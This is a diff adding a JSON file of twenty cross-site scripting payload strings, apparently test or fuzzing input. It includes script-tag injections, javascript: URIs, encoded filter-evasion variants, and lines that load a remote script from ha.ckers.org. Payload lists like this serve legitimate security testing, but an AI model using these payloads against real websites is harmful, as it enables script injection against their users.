@@ -1,0 +1,41 @@
+{
+"xss_string_0":{"xss_string":"';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode<script>alert('xss')</script>"}
+,
+"xss_string_1":{"xss_string":"//--></SCRIPT>%22>'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"}
+,
+"xss_string_2":{"xss_string":"'';!--%22<XSS>=&{()}"}
+,
+"xss_string_3":{"xss_string":"<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>"}
+,
+"xss_string_4":{"xss_string":"<IMG SRC=%22javascript:alert('XSS');%22>"}
+,
+"xss_string_5":{"xss_string":"<IMG SRC=javascript:alert('XSS')>"}
+,
+"xss_string_6":{"xss_string":"<IMG SRC=javascrscriptipt:alert('XSS')>"}
+,
+"xss_string_7":{"xss_string":"<IMG SRC=JaVaScRiPt:alert('XSS')>"}
+,
+"xss_string_8":{"xss_string":"<IMG %22%22%22><SCRIPT>alert(%22XSS%22)</SCRIPT>%22>"}
+,
+"xss_string_9":{"xss_string":"<IMG SRC=%22 &#14;  javascript:alert('XSS');%22>"}
+,
+"xss_string_10":{"xss_string":"<SCRIPT/XSS SRC=%22http://ha.ckers.org/xss.js%22></SCRIPT>"}
+,
+"xss_string_11":{"xss_string":"<SCRIPT/SRC=%22http://ha.ckers.org/xss.js%22></SCRIPT>"}
+,
+"xss_string_12":{"xss_string":"<<SCRIPT>alert(%22XSS%22);//<</SCRIPT>"}
+,
+"xss_string_13":{"xss_string":"<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>"}
+,
+"xss_string_14":{"xss_string":"\\%22;alert('XSS');//"}
+,
+"xss_string_15":{"xss_string":"</TITLE><SCRIPT>alert(%22XSS%22);</SCRIPT>"}
+,
+"xss_string_16":{"xss_string":"<TABLE><TD BACKGROUND=%22javascript:alert('XSS')%22>"}
+,
+"xss_string_17":{"xss_string":"<DIV STYLE=%22background-image: url(javascript:alert('XSS'))%22>"}
+,
+"xss_string_18":{"xss_string":"<DIV STYLE=%22background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029%22>"}
+,
+"xss_string_19":{"xss_string":"<DIV STYLE=%22width: expression(alert('XSS'));%22>"}
+}
